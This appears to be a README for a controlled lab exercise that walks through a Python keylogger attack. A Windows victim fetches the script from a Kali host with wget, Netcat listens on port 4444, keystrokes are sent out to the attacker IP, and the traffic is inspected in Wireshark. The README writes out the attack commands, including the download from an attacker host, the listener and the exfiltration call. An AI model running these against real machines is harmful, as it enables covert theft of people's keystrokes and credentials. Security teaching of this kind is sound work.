# 🛡️ Keylogger Lab Project (Controlled Ethical Simulation)

This project demonstrates how a simple keylogger can be used to capture keyboard inputs from a **victim machine (Windows 11 Pro)** and exfiltrate the data to an **attacker's machine (Kali Linux)** using **Python sockets and Netcat**, while also capturing and analyzing the traffic with **Wireshark**.

## 📚 Overview

The objective of this project is to **simulate a keylogging attack** in a controlled lab setting and study how data exfiltration can occur in real-world scenarios. This simulation includes:

* A **Python-based keylogger** using the `pynput` library
* **Netcat** on Kali Linux acting as the attacker’s listener
* **Wireshark** for monitoring captured keystrokes over the network
* Transfer of the malicious script using `wget`

## 🧪 Lab Setup

| **Component**      | **Configuration**                     |
| ------------------ | ------------------------------------- |
| 🧑‍💻 **Attacker** | Kali Linux                            |
| 🧑‍💻 **Victim**   | Windows 11 Pro (VM or Physical)       |
| 🌐 **Network**     | Host-only Adapter or Internal Network |

---

## 🔗 Attack Flow

1. **Attacker** hosts the keylogger script on a web server.
2. **Victim** downloads the script using `wget` in PowerShell or CMD.
3. **Victim** runs the script, which sends keystrokes to the **attacker's IP and port** via TCP.
4. **Attacker** listens on a specified port using **Netcat**.
5. **Wireshark** captures and inspects the network traffic.

---

## 🧰 Tools Used

* `Python 3` — Programming language used to write the keylogger
* `pynput` — Python library to capture keyboard events
* `socket` — Built-in Python module for TCP communication
* `Netcat` — Lightweight TCP/UDP listener
* `Wireshark` — Packet analyzer used for forensic inspection
* `wget` — Utility for script transfer via HTTP

## 💻 Simulation Steps (Controlled Lab Environment)

### ✅ Step 1: **Host the Keylogger on the Attacker Machine (Kali)**

On your **Kali Linux**, run a Python HTTP server to host the keylogger:

```bash
cd /path/to/keylogger_script/
python3 -m http.server 8000
```

---

### ✅ Step 2: **Download the Script on the Victim Machine (Windows 11 Pro)**

On the **Windows** machine, open **PowerShell or Command Prompt as Administrator** and run:

```powershell
wget http://<KALI_IP>:8000/keylogger.py -OutFile keylogger.py
```

> 📝 Replace `<KALI_IP>` with your actual Kali Linux IP address.

---

### ✅ Step 3: **Start the Listener on the Attacker Machine (Kali)**

On **Kali**, open another terminal and run:

```bash
nc -lvnp 4444
```

> 🎯 **Keep this terminal open.** Incoming keystrokes from the victim will appear here.

---

### ✅ Step 4: **Run the Keylogger on the Victim Machine (Windows 11 Pro)**

Make sure your script contains the following call in the `__main__` section:

```python
Keylogger("YOUR_KALI_IP", 4444).start()
```

> 📝 Replace `"YOUR_KALI_IP"` with your actual IP address.

Then, in the same terminal where you downloaded the script, run:

```powershell
python keylogger.py
```

> As the user types on the **Windows** machine, their keystrokes will be displayed in real time in the Netcat terminal on **Kali**.

---

### 🧪 Optional: **Capture Network Traffic with Wireshark**

On your **Kali Linux** machine:

1. Open **Wireshark**
2. Start capturing on the interface used (e.g., `eth0`, `enp0s3`, or similar)
3. Use this **display filter** to isolate the traffic:

```text
tcp.port == 4444
```

> 🔍 Observe how **raw keystrokes** are transmitted over the network.
